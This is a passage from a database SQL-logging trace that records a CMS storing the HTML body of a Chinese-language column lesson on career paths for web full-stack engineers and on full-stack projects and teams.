data-first-offset="true"><span data-slate-string="true"> 中说到了关于全栈工程师的职业延伸，特别是在有了相当的积累的时候，比如工作接近五年、十年的时候，很多程序员都会对自己有更深刻的认识，更明确自己需要什么，喜欢什么。Web 
全栈技术中，他们更愿意深挖某一个具体的领域；或是跳出了这个圈子，看上了另外的一棵技能树。也就是说，他们将全栈工程师作为自己的基础铺垫和视野拓展，从而成就职业进一步发展的跳板，毕竟，“有了全栈工程师的底子，未来面对软件行业进一步细化，选择其它细分职业时，会因为有了全面而扎实的基础而更有利”。</span></span></span> 
</div> <h3 class="se-4de11feb" data-slate-type="heading" data-slate-object="block" data-key="517"><span 
data-slate-object="text" data-key="518"><span data-slate-leaf="true" data-offset-key="518:0" 
data-first-offset="true"><span data-slate-string="true">纵向：深挖 Web 的一个领域</span></span></span></h3> 
<div class="se-10eb8b8d " data-slate-type="paragraph" data-slate-object="block" data-key="519"> 
<span data-slate-object="text" data-key="520"><span data-slate-leaf="true" data-offset-key="520:0" 
data-first-offset="true"><span data-slate-string="true">如你所见，Web 全栈工程的覆盖面已经很广了，然后你再有了足够的积累，既包括项目的积累，又包括个人技术、非技术能力上的积累。但同时，如果你也发现，自己更喜爱某一个特定的子领域，那么这时候，是可以花一点时间，静下心来，想一想是不是可以细化自己的职业发展通道了。下面我来举两个纵向技术衍化的例子，希望给你一点启发：</span></span></span> 
</div> <div class="se-3636e1e0 " data-slate-type="paragraph" data-slate-object="block" data-key="521"> 
<span data-slate-object="text" data-key="522"><span data-slate-leaf="true" data-offset-key="522:0" 
data-first-offset="true"><span class="se-68543c94" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">1. 前端工程师</span></span></span></span> </div> <div class="se-eb8ea918 
" data-slate-type="paragraph" data-slate-object="block" data-key="523"> <span data-slate-object="text" 
data-key="524"><span data-slate-leaf="true" data-offset-key="524:0" data-first-offset="true"><span 
data-slate-string="true">前端工程师是全栈衍化一个最常见的去向之一，当然，反过来的案例也许更多（从前端工程师到全栈）。我们在第三章一开始已经提到了，由于前端技术的特殊性，比方说，前端领域的思维模式有着显著的特殊性（参见 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="525" class="se-9a604d3a 
se-490c3d6a"><span data-slate-object="text" data-key="526"><span data-slate-leaf="true" data-offset-key="526:0" 
data-first-offset="true"><span data-slate-string="true">[第 14 讲]</span></span></span></a><span 
data-slate-object="text" data-key="527"><span data-slate-leaf="true" data-offset-key="527:0" 
data-first-offset="true"><span data-slate-string="true">），Web 领域的工作细分很早，就从独立出前端作为开始，发生了。</span></span></span> 
</div> <div class="se-76e16857 " data-slate-type="paragraph" data-slate-object="block" data-key="528"> 
<span data-slate-object="text" data-key="529"><span data-slate-leaf="true" data-offset-key="529:0" 
data-first-offset="true"><span data-slate-string="true">由于工作和项目的关系，我接触过不少不同背景的前端工程师，或是类似的角色（这个名称在不同的企业中有不同的称呼，比如 
Amazon 它叫做 WDE，Web Development Engineer），但是总体来说，有着扎实的全栈工程底子的前端工程师，还是明显地显露出，很不一样的认识问题的视野和思考角度。比方说，定位一个用户访问响应时间的问题，这样的工程师很擅长从整个请求响应的完整链路分层去剖析；再比如说，代码设计和组织，他们在分层和模块化方面，相对而言，有着普遍扎实的基础。</span></span></span> 
</div> <div class="se-70092893 " data-slate-type="paragraph" data-slate-object="block" data-key="530"> 
<span data-slate-object="text" data-key="531"><span data-slate-leaf="true" data-offset-key="531:0" 
data-first-offset="true"><span class="se-85ed99fe" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">2. SRE</span></span></span></span> </div> <div class="se-b9c4b060 
" data-slate-type="paragraph" data-slate-object="block" data-key="532"> <span data-slate-object="text" 
data-key="533"><span data-slate-leaf="true" data-offset-key="533:0" data-first-offset="true"><span 
data-slate-string="true">SRE（Site Reliability Engineer，网站可靠性工程师），这个角色最早很可能是 Google 创造出来的，从名称上也可以看出，这个职位的工程师所致力于解决的问题，就是网站可靠性的问题，这里的“可靠性”，包括可用性、延迟、容量等多个方面。他们就像是医院里的主刀大夫和急诊科医生，这是一个综合能力要求颇高的职位，也是一个绝对“实战”的职位，因为他们要面对的，都是大流量的网站等 
Web 服务，都是一点点小问题都可能带来巨大经济损失的场景。</span></span></span> </div> <div class="se-7d00f658 " data-slate-type="paragraph" 
data-slate-object="block" data-key="534"> <span data-slate-object="text" data-key="535"><span 
data-slate-leaf="true" data-offset-key="535:0" data-first-offset="true"><span data-slate-string="true">因此 
SRE 需要尽力确保服务每分每秒的正常运行，他们的扮演的角色可远不只是“救火队长”，在“时间就是金钱”的压力环境下，严谨而大胆，快速定位和解决问题，但更重要的是，帮助不同的团队“防患于未然”，比如主导和把关新建服务的可靠性设计。SRE 
有时要解决基础设施的问题，有时要分析服务端的压力来源，有时则要搞定网页上造成大量用户访问困难的“小 bug”。很显然，一个狭窄领域知识的工程师，是不可能胜任这样的岗位的，对于从端到端俯瞰整个流程的能力，Web 
全栈工程师有着天然的优势。</span></span></span> </div> <h3 class="se-22f1f193" data-slate-type="heading" 
data-slate-object="block" data-key="536"><span data-slate-object="text" data-key="537"><span 
data-slate-leaf="true" data-offset-key="537:0" data-first-offset="true"><span data-slate-string="true">横向：点亮另一棵技能树</span></span></span></h3> 
<div class="se-a3d85c0d " data-slate-type="paragraph" data-slate-object="block" data-key="538"> 
<span data-slate-object="text" data-key="539"><span data-slate-leaf="true" data-offset-key="539:0" 
data-first-offset="true"><span data-slate-string="true">下面再来看另一种分类，如果你发现自己的兴趣或是专长，并不在 Web 全栈领域方面，而是跃跃欲试地盯上了软件技术领域的另外一类角色，那其实也是一件可喜可贺的事情。毕竟，越早明确自己的兴趣和专长，在职业中做出变更的决定，就越能帮助自己接近目标，这其实有点像 
RPG 游戏中的转职了。下面我就来举几个横向衍化的例子：</span></span></span> </div> <div class="se-9d4d311c " data-slate-type="paragraph" 
data-slate-object="block" data-key="540"> <span data-slate-object="text" data-key="541"><span 
data-slate-leaf="true" data-offset-key="541:0" data-first-offset="true"><span class="se-8f321799" 
data-slate-type="bold" data-slate-object="mark"><span data-slate-string="true">1. 数据方向</span></span></span></span> 
</div> <div class="se-433da844 " data-slate-type="paragraph" data-slate-object="block" data-key="542"> 
<span data-slate-object="text" data-key="543"><span data-slate-leaf="true" data-offset-key="543:0" 
data-first-offset="true"><span data-slate-string="true">这里的数据未必指大数据。如果我们退回到 10 年前，数据所扮演的角色，远没有当今的软件行业这样重要。如果你在 
Web 全栈的学习过程中发现，自己对于数据有着超乎平常人的敏感度，或者对于数据本身所蕴含的事实原理充满兴趣，那么有一些和数据密切相关的职业角色，可能会成为你未来职业发展的一个好的选择。</span></span></span> 
</div> <div class="se-33627cb6 " data-slate-type="paragraph" data-slate-object="block" data-key="544"> 
<span data-slate-object="text" data-key="545"><span data-slate-leaf="true" data-offset-key="545:0" 
data-first-offset="true"><span data-slate-string="true">比如说数据科学家（Data Scientist）、数据分析师（Data 
Analyst）和商业智能工程师（Business Intelligence Engineer），其中的前两者，我在 </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="546" class="se-9a604d3a se-490c3d6a"><span data-slate-object="text" 
data-key="547"><span data-slate-leaf="true" data-offset-key="547:0" data-first-offset="true"><span 
data-slate-string="true">[第 20 讲]</span></span></span></a><span data-slate-object="text" data-key="548"><span 
data-slate-leaf="true" data-offset-key="548:0" data-first-offset="true"><span data-slate-string="true"> 
中有过介绍。这些角色，都需要具备相当的数据分析能力，掌握一定的统计知识。全栈工程师的背景，能让你在胜任这样的角色的时候，具备更综合的工程能力，从而脱颖而出。比如你可以更容易地设计和改进数据分析工具，比如你已经掌握了一定的数据可视化技术（参见 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="549" class="se-9a604d3a 
se-490c3d6a"><span data-slate-object="text" data-key="550"><span data-slate-leaf="true" data-offset-key="550:0" 
data-first-offset="true"><span data-slate-string="true">[第 18 讲]</span></span></span></a><span 
data-slate-object="text" data-key="551"><span data-slate-leaf="true" data-offset-key="551:0" 
data-first-offset="true"><span data-slate-string="true">），就可以迅速地将实现方案落地。</span></span></span> 
</div> <div class="se-db214054 " data-slate-type="paragraph" data-slate-object="block" data-key="552"> 
<span data-slate-object="text" data-key="553"><span data-slate-leaf="true" data-offset-key="553:0" 
data-first-offset="true"><span class="se-a24b2057" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">2. 系统方向</span></span></span></span> </div> <div class="se-75dec48c 
" data-slate-type="paragraph" data-slate-object="block" data-key="554"> <span data-slate-object="text" 
data-key="555"><span data-slate-leaf="true" data-offset-key="555:0" data-first-offset="true"><span 
data-slate-string="true">这部分往往来自于对软件系统有着更高追求的工程师，这个方向在横向衍化中具备着相当的比例，比如，有一些软件工程师职位，从职责上看，其实和 
Web 全栈工程师没有本质上的区别，但是因为其所涉及的项目、产品和技术领域独立在传统的 Web 之外，我就把它们单独拿出来介绍了。</span></span></span> </div> 
<div class="se-c9214b7b " data-slate-type="paragraph" data-slate-object="block" data-key="556"> 
<span data-slate-object="text" data-key="557"><span data-slate-leaf="true" data-offset-key="557:0" 
data-first-offset="true"><span data-slate-string="true">我觉得这一点可以以我自己为例，我这几年所呆的团队，开发和维护的产品中，都包括典型的分布式系统。两年前是一个分布式计算平台，Amazon 
所有产品的成本和利润就是在它上面完成计算的；如今在 Oracle 则是一个分布式工作流引擎。老实说，它们都和传统的 Web 全栈没有什么“直接关系”，但是正如我在专栏开始的时候所说，技术都是相通的，从全栈领域学到的那些套路和方法，可以帮助我在新的软件领域上手那些新技术。</span></span></span> 
</div> <div class="se-52f6ac0e " data-slate-type="paragraph" data-slate-object="block" data-key="558"> 
<span data-slate-object="text" data-key="559"><span data-slate-leaf="true" data-offset-key="559:0" 
data-first-offset="true"><span data-slate-string="true">我知道很多程序员朋友，从远期看都想成为架构师，比如平台架构师，解决方案架构师等等。但凡谈及“架构”基本上都意味着一个模糊的、足够大的领域。在我所了解的那些互联网巨头中，这些高级研发职位都要求跨团队、跨项目的技术决策和合作，很难想象一个狭窄领域诞生一个架构师级别的角色，而这一点，又得益于我们如今学得广、学得杂而夯实的基础。</span></span></span> 
</div> <div class="se-683c2a31 " data-slate-type="paragraph" data-slate-object="block" data-key="560"> 
<span data-slate-object="text" data-key="561"><span data-slate-leaf="true" data-offset-key="561:0" 
data-first-offset="true"><span class="se-1ac406a5" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">3. 产品经理</span></span></span></span> </div> <div class="se-5a011a32 
" data-slate-type="paragraph" data-slate-object="block" data-key="562"> <span data-slate-object="text" 
data-key="563"><span data-slate-leaf="true" data-offset-key="563:0" data-first-offset="true"><span 
data-slate-string="true">产品经理可以说也是一个非常常见的方向，产品经理和程序员之间相爱相杀的故事，已经“烂大街”了。“土生土长”的产品经理的比例其实不算太高，很多公司的产品经理都是从不同的岗位转过来的。比如运维岗，这样的产品经理，往往会额外地关注产品的可靠性以及运维的难度，毕竟他们是从这条路走过来的，深知其重要性。</span></span></span> 
</div> <div class="se-cdd64401 " data-slate-type="paragraph" data-slate-object="block" data-key="564"> 
<span data-slate-object="text" data-key="565"><span data-slate-leaf="true" data-offset-key="565:0" 
data-first-offset="true"><span data-slate-string="true">同样的，有着全栈工程师背景的产品经理，显然更能够从工程的角度出发，去理解需求的实现，理解用户交互过程背后的原理，撰写更优秀的非功能需求的产品设计文档，也可以轻而易举地做出 
HTML 快速原型。</span></span></span> </div> <h2 class="se-a04dec45" data-slate-type="heading" data-slate-object="block" 
data-key="566"><span data-slate-object="text" data-key="567"><span data-slate-leaf="true" data-offset-key="567:0" 
data-first-offset="true"><span data-slate-string="true">项目和团队</span></span></span></h2> <div 
class="se-874d0e78 " data-slate-type="paragraph" data-slate-object="block" data-key="568"> 
<span data-slate-object="text" data-key="569"><span data-slate-leaf="true" data-offset-key="569:0" 
data-first-offset="true"><span data-slate-string="true">上面我只是从个人角度介绍了全栈的衍化，这也是最常规的思路。但是，我们也完全可以从更多的角度来审视这个概念，比如说项目和团队。</span></span></span> 
</div> <div class="se-541d3390 " data-slate-type="paragraph" data-slate-object="block" data-key="570"> 
<span data-slate-object="text" data-key="571"><span data-slate-leaf="true" data-offset-key="571:0" 
data-first-offset="true"><span data-slate-string="true">在这里我想说的全栈项目，是指能够从不同的软件领域和软件技术的角度，覆盖端到端需求并解决问题的项目或项目集合，这里未必指单个的项目，而可以是多个关联项目所组成的集合；相应的，全栈团队，其实我在 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="572" class="se-9a604d3a 
se-490c3d6a"><span data-slate-object="text" data-key="573"><span data-slate-leaf="true" data-offset-key="573:0" 
data-first-offset="true"><span data-slate-string="true">[第 20 讲]</span></span></span></a><span 
data-slate-object="text" data-key="574"><span data-slate-leaf="true" data-offset-key="574:0" 
data-first-offset="true"><span data-slate-string="true"> 中已经介绍过了，是指一个团队具备较多方面、较多层次的技能，联合协作，去解决某一个领域的问题。</span></span></span> 
</div> <div class="se-01ac88e2 " data-slate-type="paragraph" data-slate-object="block" data-key="575"> 
<span data-slate-object="text" data-key="576"><span data-slate-leaf="true" data-offset-key="576:0" 
data-first-offset="true"><span data-slate-string="true">为什么要讲这个？因为我们整个专栏都在专注于 Web 全栈工程技能这一点上，但是我不希望在专栏之后，因为它而给你造成了思考的禁锢。我想学到了今天，你已经对于程序员掌握全栈技能的优势有了自己的理解，可是这一部分，完全可以衍化到项目和团队这样的维度上。</span></span></span> 
</div> <h3 class="se-cda80a83" data-slate-type="heading" data-slate-object="block" data-key="577"><span 
data-slate-object="text" data-key="578"><span data-slate-leaf="true" data-offset-key="578:0" 
data-first-offset="true"><span data-slate-string="true">我自己的故事</span></span></span></h3> <div 
class="se-b6288a93 " data-slate-type="paragraph" data-slate-object="block" data-key="579"> 
<span data-slate-object="text" data-key="580"><span data-slate-leaf="true" data-offset-key="580:0" 
data-first-offset="true"><span data-slate-string="true">在我工作的最初几年，虽然已经是一个全栈工程师了，个人技术上虽然收获很大，但是并没有产生这一个层次的认识。直到我加入了 
Amazon，它的工程师文化对我之后的成长产生了很大的影响，也就是从那时候开始，我有了对于全栈项目和全栈团队的思考。</span></span></span> </div> <div 
class="se-bb277983 " data-slate-type="paragraph" data-slate-object="block" data-key="581"> 
<span data-slate-object="text" data-key="582"><span data-slate-leaf="true" data-offset-key="582:0" 
data-first-offset="true"><span data-slate-string="true">拿我自己来举一个例子，我曾经在销量预测团队中工作，我们整个团队五十余人，用一句话来 
粗略地概括我们每天的工作，就是给几千万的商品预测销量。显然这就是一个全栈的大项目，里面有十几、二十个不同领域的小项目，包括销量预测的计算平台、高可用数据分发服务、数据同步服务、预测数据的序列化和存储服务，数据分析的可视化工具、预测统计和健康监控系统等等。</span></span></span> 
</div> <div class="se-771c8fb6 " data-slate-type="paragraph" data-slate-object="block" data-key="583"> 
<span data-slate-object="text" data-key="584"><span data-slate-leaf="true" data-offset-key="584:0" 
data-first-offset="true"><span data-slate-string="true">因此，从项目的多样性，你就能够想象团队角色的多样性（具体内容请参见 </span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="585" class="se-9a604d3a se-490c3d6a"><span 
data-slate-object="text" data-key="586"><span data-slate-leaf="true" data-offset-key="586:0" 
data-first-offset="true"><span data-slate-string="true">[第 20 讲]</span></span></span></a><span 
data-slate-object="text" data-key="587"><span data-slate-leaf="true" data-offset-key="587:0" 
data-first-offset="true"><span data-slate-string="true">）。团队中有着许许多多擅长不同领域的角色，包括软件工程师、数据科学家、数据分析师、产品经理和支持工程师等等。而单说我们最熟悉的软件工程师，就具备着不同背景、不同专长，比如有擅长 
MR 相关框架和技术的负责计算平台的工程师，有维护高可用数据分发服务的工程师，也有熟悉 Web 前后端开发的负责数据可视化的工程师等等。</span></span></span> </div> 
<div class="se-28c305fe " data-slate-type="paragraph" data-slate-object="block" data-key="588"> 
<span data-slate-object="text" data-key="589"><span data-slate-leaf="true" data-offset-key="589:0" 
data-first-offset="true"><span data-slate-string="true">后来我又加入了成本核算团队，项目也好，团队也好，技术也罢，虽然存在很大不同，可全栈的特性却是一致的。比方说，MR 
的框架和工具从 Hadoop 系变成了 Spark 系，主要编程语言从 Java 变成了 Scala，工作流引擎从一个老旧的自研引擎服务变成了一个基于 SWF（Simple Work 
Flow）开发的在公司“内部开源”的新产品（即便放到今天来说，我依然觉得，它的共享资源管理等某几个核心功能，还是要比如今市面上我见到的都要优秀一些）……可是那又怎样，项目依然包含多个层次、不同的类别，而团队则依然包含类似分类的、多样的角色。</span></span></span> 
</div> <h3 class="se-55d8241f" data-slate-type="heading" data-slate-object="block" data-key="590"><span 
data-slate-object="text" data-key="591"><span data-slate-leaf="true" data-offset-key="591:0" 
data-first-offset="true"><span data-slate-string="true">优势</span></span></span></h3> <div class="se-858f3645 
" data-slate-type="paragraph" data-slate-object="block" data-key="592"> <span data-slate-object="text" 
data-key="593"><span data-slate-leaf="true" data-offset-key="593:0" data-first-offset="true"><span 
data-slate-string="true">在我看来，一个全栈的项目和团队，至少可以具备这样几个优势：</span></span></span> </div> <div class="se-fa823e09 
" data-slate-type="paragraph" data-slate-object="block" data-key="594"> <span data-slate-object="text" 
data-key="595"><span data-slate-leaf="true" data-offset-key="595:0" data-first-offset="true"><span 
data-slate-string="true">1. 从多样的角度出发，提供完整的解决方案。</span></span></span> </div> <div class="se-2a9ffb30 
" data-slate-type="paragraph" data-slate-object="block" data-key="596"> <span data-slate-object="text" 
data-key="597"><span data-slate-leaf="true" data-offset-key="597:0" data-first-offset="true"><span 
data-slate-string="true">正如同销量预测团队中，预测一个产品的销量是一个极端困难的事儿，需要多种机器学习的模型配合工作，对于不同类型的商品，应用不同的数学模型；而数据的获取、计算、分发……这些又都需要软件来完成；数据的清洗、转换、分析又需要多种数据和统计知识，配合合适的工具来做到。对于一个角色单一的团队或项目，显然是无法做到这样一个复杂的过程的。</span></span></span> 
</div> <div class="se-4437b4cb " data-slate-type="paragraph" data-slate-object="block" data-key="598"> 
<span data-slate-object="text" data-key="599"><span data-slate-leaf="true" data-offset-key="599:0" 
data-first-offset="true"><span data-slate-string="true">2. 具备包容的团队，为不同特长和兴趣的人才提供创造价值的平台。</span></span></span> 
</div> <div class="se-04d2d2c5 " data-slate-type="paragraph" data-slate-object="block" data-key="600"> 
<span data-slate-object="text" data-key="601"><span data-slate-leaf="true" data-offset-key="601:0" 
data-first-offset="true"><span data-slate-string="true">3. 保持整体上健康和多样的思考角度，保证团队和产品的均衡发展。</span></span></span> 
</div> <div class="se-cae8e584 " data-slate-type="paragraph" data-slate-object="block" data-key="602"> 
<span data-slate-object="text" data-key="603"><span data-slate-leaf="true" data-offset-key="603:0" 
data-first-offset="true"><span data-slate-string="true">每年我们都会举办 Hackathon，大致就是，团队成员可以提出创意、“招兵买马”，完整的两、三天时间，自发组织小团队，团队里有产品经理、工程师和数据分析师等等不同角色，一起把这个创意做出快速原型。其中优秀的一部分会成为未来一年真正的项目和产品。各种创意火花碰撞，这是我最喜欢的一个地方。</span></span></span> 
</div> <h2 class="se-d2fb11bd" data-slate-type="heading" data-slate-object="block" data-key="604"><span 
data-slate-object="text" data-key="605"><span data-slate-leaf="true" data-offset-key="605:0" 
data-first-offset="true"><span data-slate-string="true">总结思考</span></span></span></h2> <div 
class="se-27583957 " data-slate-type="paragraph" data-slate-object="block" data-key="606"> 
<span data-slate-object="text" data-key="607"><span data-slate-leaf="true" data-offset-key="607:0" 
data-first-offset="true"><span data-slate-string="true">今天我聊了聊 Web 全栈工程师在完成核心技术的修炼之后，可以考虑的下一步和进一步的方向，也就是个人的全栈衍化；也从项目和团队的角度，讲了全栈的优势和重要性。</span></span></span> 
</div> <div class="se-ac8cbc20 " data-slate-type="paragraph" data-slate-object="block" data-key="608"> 
<span data-slate-object="text" data-key="609"><span data-slate-leaf="true" data-offset-key="609:0" 
data-first-offset="true"><span data-slate-string="true">不知道正在阅读的你，关于这方面，从职业规划的角度看，你的思路是怎样的，能简单分享一下吗？</span></span></span> 
</div> <h2 class="se-80ce7abc" data-slate-type="heading" data-slate-object="block" data-key="610"><span 
data-slate-object="text" data-key="611"><span data-slate-leaf="true" data-offset-key="611:0" 
data-first-offset="true"><span data-slate-string="true">扩展阅读</span></span></span></h2> <div 
class="se-1f109f45" data-slate-type="list" data-slate-object="block" data-key="612"> <div class="se-a15049ff 
se-900d7254" data-slate-type="list-line" data-slate-object="block" data-key="613"> <span data-slate-object="text" 
data-key="614"><span data-slate-leaf="true" data-offset-key="614:0" data-first-offset="true"><span 
data-slate-string="true">关于 SRE 这个角色，你可以参看 Google </span></span></span><a data-slate-type="link" 
data-slate-object="inline" data-key="615" class="se-9a604d3a se-490c3d6a"><span data-slate-object="text" 
data-key="616"><span data-slate-leaf="true" data-offset-key="616:0" data-first-offset="true"><span 
data-slate-string="true">自己的描述</span></span></span></a><span data-slate-object="text" data-key="617"><span 
data-slate-leaf="true" data-offset-key="617:0" data-first-offset="true"><span data-slate-string="true">，以及 
SRE 这个</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="618" 
class="se-9a604d3a se-490c3d6a"><span data-slate-object="text" data-key="619"><span data-slate-leaf="true" 
data-offset-key="619:0" data-first-offset="true"><span data-slate-string="true">词条</span></span></span></a><span 
data-slate-object="text" data-key="620"><span data-slate-leaf="true" data-offset-key="620:0" 
data-first-offset="true"><span data-slate-string="true">。</span></span></span> </div> <div 
class="se-22eb7be8 se-6303e970" data-slate-type="list-line" data-slate-object="block" data-key="621"> 
<span data-slate-object="text" data-key="622"><span data-slate-leaf="true" data-offset-key="622:0" 
data-first-offset="true"><span data-slate-string="true">关于文中提到的 Hackathon，想了解更多的话，你可以阅读</span></span></span><a 
data-slate-type="link" data-slate-object="inline" data-key="623" class="se-9a604d3a se-490c3d6a"><span 
data-slate-object="text" data-key="624"><span data-slate-leaf="true" data-offset-key="624:0" 
data-first-offset="true"><span data-slate-string="true">这个</span></span></span></a><span data-slate-object="text" 
data-key="625"><span data-slate-leaf="true" data-offset-key="625:0" data-first-offset="true"><span 
data-slate-string="true">内容。</span></span></span> </div> </div> <div class="se-64bc1980" data-slate-type="image" 
data-slate-object="block" data-key="626"> <img class="se-baeeae41" src="https://static001.geekbang.org/resource/image/11/8b/1181246bbd51ce348d5729696d1dc28b.jpg"> 
</div> </div>', '', 'book', 0, 'full_html', 'zh-hans', 5, 5) 
 {executed in 6 msec}
2020-11-19 11:01:03.006 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_0_, nodebodyen0_.body_value as body_val2_3_0_, 
nodebodyen0_.body_summary as body_sum3_3_0_, nodebodyen0_.bundle as bundle4_3_0_, nodebodyen0_.delta 
as delta5_3_0_, nodebodyen0_.body_format as body_for6_3_0_, nodebodyen0_.langcode as langcode7_3_0_, 
nodebodyen0_.revision_id as revision8_3_0_ from node__body nodebodyen0_ where nodebodyen0_.entity_id=5 
 {executed in 0 msec}
2020-11-19 11:01:03.007 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:01:03.014 INFO  jdbc.sqltiming Line:373 - insert into node__body (body_value, body_summary, bundle, delta, body_format, langcode, revision_id, 
entity_id) values ('<div data-slate-editor="true" data-key="505" autocorrect="off" spellcheck="false" 
data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: break-word;"> 
<div class="se-5058f413 " data-slate-type="paragraph" data-slate-object="block" data-key="506"> 
<span data-slate-object="text" data-key="507"><span data-slate-leaf="true" data-offset-key="507:0" 
data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> </div> 
<div class="se-98809fe8 " data-slate-type="paragraph" data-slate-object="block" data-key="508"> 
<span data-slate-object="text" data-key="509"><span data-slate-leaf="true" data-offset-key="509:0" 
data-first-offset="true"><span data-slate-string="true">专栏更到这里，我们已经把基于 Web 全栈的这棵大树，主要的枝枝丫丫大致都覆盖到了，可是，技术上我们总是希望“更进一步”。这棵大树所在的森林中，还有着广阔的领域等待着探索。当然，我想明确的是，我知道很多程序员还是会继续坚持这条路，因为全栈工程师本身是一个非常理想的职业发展方向，毕竟这个角色，大厂招，创业小团队更是需要；但同时我也知道，也有很多走在 
Web 全栈路上的工程师，有着更多的想法，想尝试不一样的“可能性”，而这，就是我想说的个人的“全栈衍化”了。</span></span></span> </div> <h2 class="se-475b2ef8" 
data-slate-type="heading" data-slate-object="block" data-key="510"><span data-slate-object="text" 
data-key="511"><span data-slate-leaf="true" data-offset-key="511:0" data-first-offset="true"><span 
data-slate-string="true">个人</span></span></span></h2> <div class="se-ae77b201 " data-slate-type="paragraph" 
data-slate-object="block" data-key="512"> <span data-slate-object="text" data-key="513"><span 
data-slate-leaf="true" data-offset-key="513:0" data-first-offset="true"><span data-slate-string="true">不知道你是否能记得起，我在这个专栏的 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="514" class="se-9a604d3a 
se-490c3d6a"><span data-slate-object="text" data-key="515"><span data-slate-leaf="true" data-offset-key="515:0" 
data-first-offset="true"><span data-slate-string="true">[开篇词]</span></span></span></a><span 
data-slate-object="text" data-key="516"><span data-slate-leaf="true" data-offset-key="516:0" 
data-first-offset="true"><span data-slate-string="true"> 中说到了关于全栈工程师的职业延伸，特别是在有了相当的积累的时候，比如工作接近五年、十年的时候，很多程序员都会对自己有更深刻的认识，更明确自己需要什么，喜欢什么。Web 
全栈技术中，他们更愿意深挖某一个具体的领域；或是跳出了这个圈子，看上了另外的一棵技能树。也就是说，他们将全栈工程师作为自己的基础铺垫和视野拓展，从而成就职业进一步发展的跳板，毕竟，“有了全栈工程师的底子，未来面对软件行业进一步细化，选择其它细分职业时，会因为有了全面而扎实的基础而更有利”。</span></span></span> 
</div> <h3 class="se-4de11feb" data-slate-type="heading" data-slate-object="block" data-key="517"><span 
data-slate-object="text" data-key="518"><span data-slate-leaf="true" data-offset-key="518:0" 
data-first-offset="true"><span data-slate-string="true">纵向：深挖 Web 的一个领域</span></span></span></h3> 
<div class="se-10eb8b8d " data-slate-type="paragraph" data-slate-object="block" data-key="519"> 
<span data-slate-object="text" data-key="520"><span data-slate-leaf="true" data-offset-key="520:0" 
data-first-offset="true"><span data-slate-string="true">如你所见，Web 全栈工程的覆盖面已经很广了，然后你再有了足够的积累，既包括项目的积累，又包括个人技术、非技术能力上的积累。但同时，如果你也发现，自己更喜爱某一个特定的子领域，那么这时候，是可以花一点时间，静下心来，想一想是不是可以细化自己的职业发展通道了。下面我来举两个纵向技术衍化的例子，希望给你一点启发：</span></span></span> 
</div> <div class="se-3636e1e0 " data-slate-type="paragraph" data-slate-object="block" data-key="521"> 
<span data-slate-object="text" data-key="522"><span data-slate-leaf="true" data-offset-key="522:0" 
data-first-offset="true"><span class="se-68543c94" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">1. 前端工程师</span></span></span></span> </div> <div class="se-eb8ea918 
" data-slate-type="paragraph" data-slate-object="block" data-key="523"> <span data-slate-object="text" 
data-key="524"><span data-slate-leaf="true" data-offset-key="524:0" data-first-offset="true"><span 
data-slate-string="true">前端工程师是全栈衍化一个最常见的去向之一，当然，反过来的案例也许更多（从前端工程师到全栈）。我们在第三章一开始已经提到了，由于前端技术的特殊性，比方说，前端领域的思维模式有着显著的特殊性（参见 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="525" class="se-9a604d3a 
se-490c3d6a"><span data-slate-object="text" data-key="526"><span data-slate-leaf="true" data-offset-key="526:0" 
data-first-offset="true"><span data-slate-string="true">[第 14 讲]</span></span></span></a><span 
data-slate-object="text" data-key="527"><span data-slate-leaf="true" data-offset-key="527:0" 
data-first-offset="true"><span data-slate-string="true">），Web 领域的工作细分很早，就从独立出前端作为开始，发生了。</span></span></span> 
</div> <div class="se-76e16857 " data-slate-type="paragraph" data-slate-object="block" data-key="528"> 
<span data-slate-object="text" data-key="529"><span data-slate-leaf="true" data-offset-key="529:0" 
data-first-offset="true"><span data-slate-string="true">由于工作和项目的关系，我接触过不少不同背景的前端工程师，或是类似的角色（这个名称在不同的企业中有不同的称呼，比如 
Amazon 它叫做 WDE，Web Development Engineer），但是总体来说，有着扎实的全栈工程底子的前端工程师，还是明显地显露出，很不一样的认识问题的视野和思考角度。比方说，定位一个用户访问响应时间的问题，这样的工程师很擅长从整个请求响应的完整链路分层去剖析；再比如说，代码设计和组织，他们在分层和模块化方面，相对而言，有着普遍扎实的基础。</span></span></span> 
</div> <div class="se-70092893 " data-slate-type="paragraph" data-slate-object="block" data-key="530"> 
<span data-slate-object="text" data-key="531"><span data-slate-leaf="true" data-offset-key="531:0" 
data-first-offset="true"><span class="se-85ed99fe" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">2. SRE</span></span></span></span> </div> <div class="se-b9c4b060 
" data-slate-type="paragraph" data-slate-object="block" data-key="532"> <span data-slate-object="text" 
data-key="533"><span data-slate-leaf="true" data-offset-key="533:0" data-first-offset="true"><span 
data-slate-string="true">SRE（Site Reliability Engineer，网站可靠性工程师），这个角色最早很可能是 Google 创造出来的，从名称上也可以看出，这个职位的工程师所致力于解决的问题，就是网站可靠性的问题，这里的“可靠性”，包括可用性、延迟、容量等多个方面。他们就像是医院里的主刀大夫和急诊科医生，这是一个综合能力要求颇高的职位，也是一个绝对“实战”的职位，因为他们要面对的，都是大流量的网站等 
Web 服务，都是一点点小问题都可能带来巨大经济损失的场景。</span></span></span> </div> <div class="se-7d00f658 " data-slate-type="paragraph" 
data-slate-object="block" data-key="534"> <span data-slate-object="text" data-key="535"><span 
